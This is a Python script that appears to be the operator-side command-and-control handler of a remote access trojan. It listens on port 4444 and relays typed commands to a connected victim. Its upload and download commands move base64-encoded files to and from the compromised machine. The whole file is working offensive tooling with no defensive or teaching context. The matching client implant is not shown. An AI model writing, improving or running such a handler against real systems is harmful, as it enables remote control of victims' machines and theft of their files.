import socket
import json
import os
import base64
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Server configuration
HOST = "0.0.0.0"  # Replace with your server's IP address
PORT = 4444  # Replace with your desired port

# Function to send JSON data
def send_json(sock, data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())

# Function to receive JSON data
def receive_json(sock):
    json_data = ""
    while True:
        try:
            json_data += sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

# Function to read a file and encode it in base64
def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode()

# Function to write a file from base64 encoded content
def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
        return "[+] Download successful [+]"

# Print starting message
print(Fore.GREEN + "Starting TCP Handler...")

# Set up the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

# Wait for a connection
print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
client_socket, client_address = server.accept()
print(Fore.GREEN + f"Connection established with {client_address}")

try:
    while True:
        # Get user input
        command = input(Fore.CYAN + "> ").strip().split(" ")

        # Handle the 'upload' command
        if command[0] == "upload":
            try:
                file_content = read_file(command[1])
                command.append(file_content)
            except Exception as e:
                print(Fore.RED + f"Error reading file: {e}")
                continue

        # Send the command to the client
        send_json(client_socket, command)

        # Receive the output from the client
        output = receive_json(client_socket)

        if command[0] == "download":
            try:
                output = write_file(command[1], output)
            except Exception as e:
                output = f"Error saving downloaded file: {e}"

        print(Fore.WHITE + output)

except KeyboardInterrupt:
    print(Fore.RED + "\nShutting down the server.")
    client_socket.close()
    server.close()
